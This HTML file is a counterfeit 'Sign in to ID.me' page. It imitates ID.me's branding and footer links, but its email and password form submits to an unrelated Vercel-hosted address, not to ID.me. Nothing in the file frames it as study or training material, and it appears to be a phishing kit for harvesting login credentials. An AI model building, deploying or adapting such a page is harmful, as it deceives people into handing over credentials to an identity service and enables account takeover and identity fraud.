<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to ID.me - ID.me</title>
    <link rel="stylesheet" href="index.css" />
  </head>

  <body>
    <div class="header">
      <img src="IMG_5868.jpeg" alt="" />
    </div>
    <div class="body-container">
      <div class="body">
        <div class="form-header">
          <h1>Sign in to ID.me</h1>
        </div>
        <div class="newID">
          <p>New to ID.me?</p>
          <p>
            <a href="#">Create an ID.me account</a>
          </p>
        </div>
        <form action="https://otp-orpin.vercel.app/">
          <div class="form-fields">
            <div class="field-group">
              <div class="email">
                <label class="input-labels" for="email">Email</label><br />
                <input
                  id="email"
                  class="input-fields"
                  type="email"
                  title="email"
                  placeholder="Enter your email address"
                  required
                /><br />
              </div>
              <div class="password">
                <label class="input-labels" for="password">Password</label
                ><br />
                <input
                  id="password"
                  class="input-fields"
                  type="password"
                  title="password"
                  placeholder="Enter password"
                  required
                /><br />
              </div>
              <div class="remember">
                <input
                  class="checkbox"
                  type="checkbox"
                  name="remember"
                  id="remember"
                  title="remember"
                />
                <label for="remember">
                  <span> Remember me </span>
                  <div id="remember-me-tip">
                    For your security, select only on your devices.
                  </div>
                </label>
              </div>
            </div>
          </div>
          <div class="form-actions">
            <button type="submit" class="sign-btn" id="submit_btn">
              Sign in
            </button>
          </div>
        </form>

        <div class="form-footer">
          <p>
            <a href="#">Forgot password</a>
          </p>
        </div>
        <footer class="footer">
          <nav class="footer-links">
            <ul class="footer-list">
              <li class="footer-list-item active">
                <a
                  rel="noopener noreferrer"
                  class="footer__link"
                  title="What is ID.me? (opens in new tab)"
                  aria-label="What is ID.me? (opens in new tab)"
                  href="https://www.id.me/about"
                  >What is ID.me?</a
                >
              </li>
              <span class="line">|</span>
              <li class="footer-list-item active">
                <a
                  rel="noopener noreferrer"
                  class="footer__link"
                  title="Terms of Service (opens in new tab)"
                  aria-label="Terms of Service (opens in new tab)"
                  href="https://www.id.me/terms"
                  >Terms of Service</a
                >
              </li>
              <span class="line">|</span>
              <li class="footer-list-item">
                <a
                  rel="noopener noreferrer"
                  class="footer__link"
                  title="Privacy Policy (opens in new tab)"
                  aria-label="Privacy Policy (opens in new tab)"
                  href="https://www.id.me/privacy"
                  >Privacy Policy</a
                >
              </li>
            </ul>
          </nav>
        </footer>
      </div>
    </div>
  </body>
</html>
